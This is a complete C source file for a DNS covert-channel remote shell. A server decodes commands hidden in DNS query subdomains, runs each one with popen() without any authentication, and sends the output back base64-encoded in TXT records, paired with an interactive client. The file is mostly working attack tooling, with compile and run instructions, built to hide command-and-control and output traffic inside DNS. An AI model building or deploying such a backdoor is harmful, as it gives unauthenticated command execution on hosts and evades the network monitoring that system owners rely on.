/*
 * dns_shell.c — DNS covert channel remote shell
 *
 * Commands are base32-encoded into DNS query subdomain labels.
 * Output is base64-encoded in TXT record responses.
 *
 * Query name format:
 *   <b32_label0>.<b32_label1>...<txid_4hex>.cmd.shell.tunnel
 *
 * The client includes an EDNS0 OPT record to advertise a 4096-byte
 * UDP buffer, allowing larger responses.  Output is capped at 2800
 * raw bytes per query (~3734 bytes base64, well within 4096 bytes).
 *
 * No real DNS infrastructure is required — the client sends DNS-format
 * UDP packets directly to the server IP.
 *
 * Compile:
 *   gcc -O2 -Wall -Wextra -std=c17 -o dns_shell dns_shell.c
 *
 * Run (port 5353 for unprivileged; 53 requires root):
 *   ./dns_shell server [port]
 *   ./dns_shell client <server_ip> [port]
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <errno.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <netinet/in.h>

/* ── constants ────────────────────────────────────────────────────────── */

#define BASE_DOMAIN     "shell.tunnel"
#define CMD_MARKER      "cmd"
#define DNS_TYPE_TXT    16
#define DNS_CLASS_IN    1
#define DNS_MAX_UDP     4096
#define DNS_MAX_NAME    256
#define LABEL_MAX       63
#define OUTPUT_MAX      2800    /* raw bytes; base64 fits comfortably in 4 KB */
#define CMD_MAX         118     /* max command bytes that fit in one qname */
#define DEFAULT_PORT    5353

_Static_assert(OUTPUT_MAX < DNS_MAX_UDP, "OUTPUT_MAX must fit in one DNS UDP datagram");
_Static_assert(CMD_MAX <= 118,           "CMD_MAX exceeds DNS qname label budget");
_Static_assert(DNS_MAX_NAME >= 253,      "DNS_MAX_NAME too small for max FQDN length");

/* ── base32 encode / decode ───────────────────────────────────────────── */

static const char B32_ALPHA[] = "abcdefghijklmnopqrstuvwxyz234567";

static size_t b32_encode(const uint8_t *in, size_t in_len, char *out)
{
    uint64_t bits = 0;
    int nbits = 0;
    size_t o = 0;
    for (size_t i = 0; i < in_len; i++) {
        bits   = (bits << 8) | in[i];
        nbits += 8;
        while (nbits >= 5) {
            nbits -= 5;
            out[o++] = B32_ALPHA[(bits >> nbits) & 0x1F];
        }
    }
    if (nbits > 0)
        out[o++] = B32_ALPHA[(bits << (5 - nbits)) & 0x1F];
    out[o] = '\0';
    return o;
}

static int b32_char_val(char c)
{
    if (c >= 'a' && c <= 'z') return c - 'a';
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= '2' && c <= '7') return 26 + (c - '2');
    return -1;
}

static size_t b32_decode(const char *in, size_t in_len, uint8_t *out)
{
    uint64_t bits = 0;
    int nbits = 0;
    size_t o = 0;
    for (size_t i = 0; i < in_len; i++) {
        if (in[i] == '=') break;
        int v = b32_char_val(in[i]);
        if (v < 0) continue;
        bits   = (bits << 5) | (uint64_t)v;
        nbits += 5;
        if (nbits >= 8) {
            nbits -= 8;
            out[o++] = (uint8_t)(bits >> nbits);
        }
    }
    return o;
}

/* ── base64 encode / decode ───────────────────────────────────────────── */

static const char B64_ALPHA[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

static size_t b64_encode(const uint8_t *in, size_t in_len, char *out)
{
    size_t o = 0;
    for (size_t i = 0; i < in_len; i += 3) {
        uint32_t v = (uint32_t)in[i] << 16;
        if (i+1 < in_len) v |= (uint32_t)in[i+1] << 8;
        if (i+2 < in_len) v |= in[i+2];
        out[o++] = B64_ALPHA[(v >> 18) & 0x3F];
        out[o++] = B64_ALPHA[(v >> 12) & 0x3F];
        out[o++] = (i+1 < in_len) ? B64_ALPHA[(v >> 6) & 0x3F] : '=';
        out[o++] = (i+2 < in_len) ? B64_ALPHA[ v        & 0x3F] : '=';
    }
    out[o] = '\0';
    return o;
}

static int b64_char_val(char c)
{
    if (c >= 'A' && c <= 'Z') return c - 'A';
    if (c >= 'a' && c <= 'z') return 26 + (c - 'a');
    if (c >= '0' && c <= '9') return 52 + (c - '0');
    if (c == '+') return 62;
    if (c == '/') return 63;
    return -1;
}

static size_t b64_decode(const char *in, size_t in_len, uint8_t *out)
{
    uint32_t v = 0;
    int vbits = 0;
    size_t o = 0;
    for (size_t i = 0; i < in_len && in[i] != '='; i++) {
        int c = b64_char_val(in[i]);
        if (c < 0) continue;
        v     = (v << 6) | (uint32_t)c;
        vbits += 6;
        if (vbits >= 8) {
            vbits -= 8;
            out[o++] = (uint8_t)(v >> vbits);
        }
    }
    return o;
}

/* ── DNS wire format helpers ──────────────────────────────────────────── */

/*
 * Encode a dotted-label name to DNS wire format.
 * Returns bytes written, or -1 on overflow.
 */
static int dns_encode_name(const char *name, uint8_t *out, int size)
{
    int pos = 0;
    while (*name) {
        const char *dot = strchr(name, '.');
        int llen = dot ? (int)(dot - name) : (int)strlen(name);
        if (llen > LABEL_MAX || pos + 1 + llen + 1 > size) return -1;
        out[pos++] = (uint8_t)llen;
        memcpy(out + pos, name, llen);
        pos += llen;
        name += llen + (dot ? 1 : 0);
        if (!dot) break;
    }
    if (pos >= size) return -1;
    out[pos++] = 0;
    return pos;
}

/*
 * Decode a DNS wire-format name starting at pkt[offset].
 * Returns bytes consumed at offset (not counting pointer targets), -1 on error.
 * Writes NUL-terminated result into name_out[name_size].
 */
static int dns_decode_name(const uint8_t *pkt, int pkt_len, int offset,
                            char *name_out, int name_size)
{
    char  *p       = name_out;
    char  *end     = name_out + name_size - 1;
    int    pos     = offset;
    int    consumed = -1;
    int    depth   = 0;

    while (pos < pkt_len && depth < 10) {
        uint8_t b = pkt[pos];

        if ((b & 0xC0) == 0xC0) {
            if (pos + 1 >= pkt_len) return -1;
            if (consumed < 0) consumed = pos - offset + 2;
            pos = ((b & 0x3F) << 8) | pkt[pos + 1];
            depth++;
            continue;
        }
        if (b == 0) {
            if (consumed < 0) consumed = pos - offset + 1;
            break;
        }
        pos++;
        if (pos + (int)b > pkt_len) return -1;
        if (p + b + 1 < end) {
            memcpy(p, pkt + pos, b);
            p += b;
            *p++ = '.';
        }
        pos += b;
    }

    if (p > name_out && p[-1] == '.') p--;
    *p = '\0';
    return consumed;
}

/* ── DNS packet builders / parsers ────────────────────────────────────── */

/*
 * Build a DNS TXT query for qname, with an EDNS0 OPT record (4096 bytes).
 * Returns total packet length, or -1 on error.
 */
static int build_query(uint8_t *out, int size, uint16_t txid, const char *qname)
{
    if (size < 12) return -1;
    out[0]  = (uint8_t)(txid >> 8); out[1]  = (uint8_t)(txid & 0xFF);
    out[2]  = 0x01; out[3] = 0x00;       /* flags: QR=0, RD=1             */
    out[4]  = 0x00; out[5] = 0x01;       /* QDCOUNT = 1                   */
    out[6]  = 0x00; out[7] = 0x00;       /* ANCOUNT = 0                   */
    out[8]  = 0x00; out[9] = 0x00;       /* NSCOUNT = 0                   */
    out[10] = 0x00; out[11] = 0x01;      /* ARCOUNT = 1 (OPT)             */

    int pos = 12;
    int n = dns_encode_name(qname, out + pos, size - pos);
    if (n < 0) return -1;
    pos += n;
    if (pos + 4 > size) return -1;
    out[pos++] = 0x00; out[pos++] = 0x10;  /* QTYPE  = TXT  */
    out[pos++] = 0x00; out[pos++] = 0x01;  /* QCLASS = IN   */

    /* EDNS0 OPT record (11 bytes) */
    if (pos + 11 > size) return -1;
    out[pos++] = 0x00;                      /* Name: root      */
    out[pos++] = 0x00; out[pos++] = 0x29;  /* Type: OPT (41)  */
    out[pos++] = 0x10; out[pos++] = 0x00;  /* Class: 4096     */
    out[pos++] = 0x00; out[pos++] = 0x00;  /* TTL hi: ext RCODE */
    out[pos++] = 0x00; out[pos++] = 0x00;  /* TTL lo: flags   */
    out[pos++] = 0x00; out[pos++] = 0x00;  /* RDLENGTH: 0     */

    return pos;
}

/*
 * Parse a DNS query; fill txid and qname_out (DNS_MAX_NAME bytes).
 * Returns 1 on success, 0 on failure.
 */
static int parse_query(const uint8_t *pkt, int pkt_len,
                        uint16_t *txid, char *qname_out)
{
    if (pkt_len < 12) return 0;
    *txid = (uint16_t)((pkt[0] << 8) | pkt[1]);
    uint16_t qdcount = (uint16_t)((pkt[4] << 8) | pkt[5]);
    if (qdcount == 0) return 0;
    int n = dns_decode_name(pkt, pkt_len, 12, qname_out, DNS_MAX_NAME);
    return n > 0 ? 1 : 0;
}

/*
 * Build a DNS TXT response.  txt_payload is split into 255-byte strings.
 * Returns total packet length, or -1 on error.
 */
static int build_txt_response(uint8_t *out, int size, uint16_t txid,
                               const char *qname,
                               const uint8_t *txt, size_t txt_len)
{
    if (size < 12) return -1;
    out[0]  = (uint8_t)(txid >> 8); out[1]  = (uint8_t)(txid & 0xFF);
    out[2]  = 0x81; out[3] = 0x80;   /* flags: QR=1, AA=1, RD=1, RA=1  */
    out[4]  = 0x00; out[5] = 0x01;   /* QDCOUNT = 1                     */
    out[6]  = 0x00; out[7] = 0x01;   /* ANCOUNT = 1                     */
    out[8]  = 0x00; out[9] = 0x00;
    out[10] = 0x00; out[11] = 0x00;

    int pos = 12;
    int n = dns_encode_name(qname, out + pos, size - pos);
    if (n < 0) return -1;
    pos += n;
    if (pos + 4 > size) return -1;
    out[pos++] = 0x00; out[pos++] = 0x10;  /* QTYPE  = TXT */
    out[pos++] = 0x00; out[pos++] = 0x01;  /* QCLASS = IN  */

    /* Answer section */
    if (pos + 12 > size) return -1;
    /* Name pointer back to question (offset 12 = 0xC00C) */
    out[pos++] = 0xC0; out[pos++] = 0x0C;
    out[pos++] = 0x00; out[pos++] = 0x10;  /* TYPE  = TXT */
    out[pos++] = 0x00; out[pos++] = 0x01;  /* CLASS = IN  */
    out[pos++] = 0x00; out[pos++] = 0x00;
    out[pos++] = 0x00; out[pos++] = 0x00;  /* TTL = 0     */

    /* Build RDATA: length-prefixed 255-byte strings */
    int rdlen_pos = pos;
    out[pos++] = 0x00; out[pos++] = 0x00;  /* RDLENGTH placeholder */

    int rdata_start = pos;
    size_t remaining = txt_len;
    const uint8_t *tp = txt;
    while (remaining > 0) {
        size_t slen = remaining > 255 ? 255 : remaining;
        if (pos + 1 + (int)slen > size) break;
        out[pos++] = (uint8_t)slen;
        memcpy(out + pos, tp, slen);
        pos += (int)slen;
        tp        += slen;
        remaining -= slen;
    }

    uint16_t rdlen = (uint16_t)(pos - rdata_start);
    out[rdlen_pos]     = (uint8_t)(rdlen >> 8);
    out[rdlen_pos + 1] = (uint8_t)(rdlen & 0xFF);

    return pos;
}

/*
 * Extract concatenated TXT string data from a DNS response.
 * Writes result to out[out_size].  Returns bytes written, or -1 on error.
 */
static int parse_txt_response(const uint8_t *pkt, int pkt_len,
                               char *out, int out_size)
{
    if (pkt_len < 12) return -1;
    uint16_t qdcount = (uint16_t)((pkt[4] << 8) | pkt[5]);
    uint16_t ancount = (uint16_t)((pkt[6] << 8) | pkt[7]);
    if (ancount == 0) return -1;

    int pos = 12;
    char tmp[DNS_MAX_NAME];

    /* skip question section */
    for (int q = 0; q < (int)qdcount; q++) {
        int n = dns_decode_name(pkt, pkt_len, pos, tmp, sizeof tmp);
        if (n < 0) return -1;
        pos += n + 4;   /* name bytes + QTYPE + QCLASS */
    }

    int written = 0;
    for (int a = 0; a < (int)ancount && pos < pkt_len; a++) {
        int n = dns_decode_name(pkt, pkt_len, pos, tmp, sizeof tmp);
        if (n < 0) return -1;
        pos += n;
        if (pos + 10 > pkt_len) break;

        uint16_t rtype  = (uint16_t)((pkt[pos] << 8) | pkt[pos+1]);
        uint16_t rdlen  = (uint16_t)((pkt[pos+8] << 8) | pkt[pos+9]);
        pos += 10;

        if (rtype == DNS_TYPE_TXT && rdlen > 0 && pos + rdlen <= pkt_len) {
            int rpos = 0;
            while (rpos < (int)rdlen) {
                int slen = pkt[pos + rpos++];
                if (rpos + slen > (int)rdlen) break;
                int copy = slen;
                if (written + copy >= out_size) copy = out_size - written - 1;
                memcpy(out + written, pkt + pos + rpos, copy);
                written += copy;
                rpos += slen;
            }
        }
        pos += rdlen;
    }

    if (written >= 0) out[written] = '\0';
    return written;
}

/* ── protocol: qname encoding / decoding ─────────────────────────────── */

/*
 * Encode cmd_bytes as a DNS query name:
 *   <b32label0>.<b32label1>...<txid_hex>.cmd.shell.tunnel
 *
 * Returns 1 on success, 0 if cmd is too long.
 */
static int encode_cmd_qname(const uint8_t *cmd, size_t cmd_len,
                             uint16_t txid, char *qname_out)
{
    /* b32 of cmd_len bytes needs ceil(cmd_len*8/5) chars, max CMD_MAX*8/5 */
    char b32[CMD_MAX * 2];
    size_t b32_len = b32_encode(cmd, cmd_len, b32);

    /* Split into LABEL_MAX-char labels */
    char *p = qname_out;
    size_t i = 0;
    while (i < b32_len) {
        size_t chunk = b32_len - i;
        if (chunk > LABEL_MAX) chunk = LABEL_MAX;
        if (i > 0) *p++ = '.';
        memcpy(p, b32 + i, chunk);
        p += chunk;
        i += chunk;
    }

    /* Metadata: <txid_hex>.cmd.shell.tunnel */
    p += sprintf(p, "%s%04x.%s.%s",
                 (b32_len ? "." : ""), (unsigned)txid,
                 CMD_MARKER, BASE_DOMAIN);
    *p = '\0';
    return 1;
}

/*
 * Decode a query name.  Returns 1 and fills txid/cmd/cmd_len on success.
 * Returns 0 if not our query.
 */
static int decode_cmd_qname(const char *qname, uint16_t *txid,
                              uint8_t *cmd_out, size_t *cmd_len)
{
    /* Expected suffix: ".<txid>.cmd.shell.tunnel" */
    const char *suffix = "." CMD_MARKER "." BASE_DOMAIN;
    size_t slen = strlen(suffix);
    size_t qlen = strlen(qname);

    if (qlen <= slen) return 0;
    const char *tail = qname + qlen - slen;
    if (strcasecmp(tail, suffix) != 0) return 0;

    /* The label just before the suffix is the txid */
    size_t data_end = (size_t)(tail - qname);   /* index of '.' before txid */
    if (data_end == 0) return 0;

    /* Find start of txid label (scan back to previous '.' or start) */
    const char *txid_end = qname + data_end;     /* points to '.' before suffix */
    const char *txid_start = txid_end - 1;
    while (txid_start > qname && txid_start[-1] != '.') txid_start--;

    /* txid is exactly 4 hex chars */
    if (txid_end - txid_start != 4) return 0;
    char txid_buf[5];
    memcpy(txid_buf, txid_start, 4);
    txid_buf[4] = '\0';
    char *endp;
    *txid = (uint16_t)strtoul(txid_buf, &endp, 16);
    if (*endp) return 0;

    /* Everything before the txid label is b32-encoded command data */
    size_t b32_region_len = (size_t)(txid_start - qname);
    if (b32_region_len > 0) b32_region_len--;  /* strip trailing dot */

    /* Concatenate labels (strip dots) into one b32 string */
    char b32_flat[CMD_MAX * 2 + 8];
    size_t flat_len = 0;
    for (size_t k = 0; k < b32_region_len; k++) {
        if (qname[k] != '.') b32_flat[flat_len++] = qname[k];
    }
    b32_flat[flat_len] = '\0';

    *cmd_len = b32_decode(b32_flat, flat_len, cmd_out);
    return 1;
}

/* ── command execution ────────────────────────────────────────────────── */

static uint8_t *run_cmd(const char *cmd, size_t *out_len)
{
    uint8_t *buf = (uint8_t *)malloc(OUTPUT_MAX + 1);
    if (!buf) { *out_len = 0; return NULL; }

    FILE *fp = popen(cmd, "r");
    if (!fp) {
        snprintf((char *)buf, OUTPUT_MAX, "(popen: %s)\n", strerror(errno));
        *out_len = strlen((char *)buf);
        return buf;
    }
    size_t n = fread(buf, 1, OUTPUT_MAX, fp);
    pclose(fp);
    if (n == 0) { memcpy(buf, "(no output)\n", 13); n = 12; }
    *out_len = n;
    return buf;
}

/* ── server ───────────────────────────────────────────────────────────── */

static void print_local_ip(void)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in a = {0};
    a.sin_family = AF_INET;
    a.sin_port   = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &a.sin_addr);
    if (connect(s, (struct sockaddr *)&a, sizeof a) == 0) {
        struct sockaddr_in local = {0};
        socklen_t len = sizeof local;
        if (getsockname(s, (struct sockaddr *)&local, &len) == 0) {
            char ip[INET_ADDRSTRLEN];
            inet_ntop(AF_INET, &local.sin_addr, ip, sizeof ip);
            printf("[*] Server IP: %s\n", ip);
        }
    }
    close(s);
}

static void do_server(int port)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { perror("socket"); exit(1); }

    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &one, sizeof one);

    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons((uint16_t)port);
    if (bind(fd, (struct sockaddr *)&addr, sizeof addr) < 0) {
        perror("bind"); exit(1);
    }

    print_local_ip();
    printf("[*] DNS server — UDP :%d  (Ctrl-C to stop)\n", port);

    uint8_t pkt[DNS_MAX_UDP];
    uint8_t resp[DNS_MAX_UDP];

    for (;;) {
        struct sockaddr_in src = {0};
        socklen_t src_len = sizeof src;
        ssize_t n = recvfrom(fd, pkt, sizeof pkt, 0,
                              (struct sockaddr *)&src, &src_len);
        if (n < 0) continue;

        uint16_t txid;
        char qname[DNS_MAX_NAME];
        if (!parse_query(pkt, (int)n, &txid, qname)) continue;

        uint16_t cmd_txid;
        uint8_t cmd_bytes[CMD_MAX + 1];
        size_t cmd_len;
        if (!decode_cmd_qname(qname, &cmd_txid, cmd_bytes, &cmd_len)) continue;

        cmd_bytes[cmd_len] = '\0';
        char src_str[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &src.sin_addr, src_str, sizeof src_str);
        printf("[+] %-16s txid=0x%04x  %s\n", src_str, (unsigned)txid,
               (char *)cmd_bytes);
        fflush(stdout);

        size_t out_len;
        uint8_t *output = run_cmd((char *)cmd_bytes, &out_len);
        if (!output) continue;

        /* Base64-encode output for safe embedding in TXT records */
        char b64[OUTPUT_MAX * 2 + 8];
        b64_encode(output, out_len, b64);
        free(output);

        int resp_len = build_txt_response(resp, sizeof resp, txid, qname,
                                           (uint8_t *)b64, strlen(b64));
        if (resp_len > 0)
            sendto(fd, resp, resp_len, 0, (struct sockaddr *)&src, src_len);
    }
}

/* ── client ───────────────────────────────────────────────────────────── */

static void do_client(const char *server_ip, int port)
{
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) { perror("socket"); exit(1); }

    struct timeval tv = { 5, 0 };
    setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof tv);

    struct sockaddr_in dst = {0};
    dst.sin_family = AF_INET;
    dst.sin_port   = htons((uint16_t)port);
    if (inet_pton(AF_INET, server_ip, &dst.sin_addr) != 1) {
        fprintf(stderr, "bad IP address: %s\n", server_ip);
        exit(1);
    }

    printf("[*] DNS shell → %s:%d  (type 'exit' to quit)\n", server_ip, port);

    uint16_t txid = 1;
    char cmd_buf[CMD_MAX + 1];
    uint8_t pkt[DNS_MAX_UDP];
    uint8_t resp[DNS_MAX_UDP];

    for (;;) {
        printf("dns> ");
        fflush(stdout);
        if (!fgets(cmd_buf, (int)sizeof cmd_buf, stdin)) break;

        size_t clen = strlen(cmd_buf);
        while (clen && (cmd_buf[clen-1] == '\n' || cmd_buf[clen-1] == '\r'))
            cmd_buf[--clen] = '\0';
        if (clen == 0) continue;
        if (!strcmp(cmd_buf, "exit") || !strcmp(cmd_buf, "quit")) break;

        if (clen > CMD_MAX) {
            printf("[!] Command too long (max %d bytes).\n", CMD_MAX);
            continue;
        }

        char qname[DNS_MAX_NAME];
        encode_cmd_qname((uint8_t *)cmd_buf, clen, txid, qname);

        int pkt_len = build_query(pkt, sizeof pkt, txid, qname);
        if (pkt_len < 0) { printf("[!] Query build failed.\n"); continue; }

        txid = (uint16_t)((txid + 1) & 0xFFFF);

        if (sendto(fd, pkt, pkt_len, 0,
                   (struct sockaddr *)&dst, sizeof dst) < 0) {
            perror("sendto"); continue;
        }

        ssize_t n = recvfrom(fd, resp, sizeof resp, 0, NULL, NULL);
        if (n < 0) {
            printf("[!] No response (timeout).\n"); continue;
        }

        char b64[DNS_MAX_UDP * 2];
        int b64_len = parse_txt_response(resp, (int)n, b64, sizeof b64);
        if (b64_len <= 0) {
            printf("[!] No TXT data in response.\n"); continue;
        }

        uint8_t output[OUTPUT_MAX + 1];
        size_t out_len = b64_decode(b64, b64_len, output);
        if (out_len == 0) {
            printf("[!] Decode error.\n"); continue;
        }
        fwrite(output, 1, out_len, stdout);
        fflush(stdout);
    }

    printf("[*] Bye.\n");
    close(fd);
}

/* ── main ─────────────────────────────────────────────────────────────── */

int main(int argc, char *argv[])
{
    if (argc < 2) goto usage;

    int port = DEFAULT_PORT;
    if (argc >= 3) port = atoi(argv[argc - 1]);

    if (!strcmp(argv[1], "server")) {
        if (argc == 3) port = atoi(argv[2]);
        do_server(port);
        return 0;
    }
    if (!strcmp(argv[1], "client")) {
        if (argc < 3) { fprintf(stderr, "missing server IP\n"); goto usage; }
        if (argc == 4) port = atoi(argv[3]);
        do_client(argv[2], port);
        return 0;
    }
usage:
    fprintf(stderr, "usage: %s server [port]\n"
                    "       %s client <server_ip> [port]\n",
            argv[0], argv[0]);
    return 1;
}
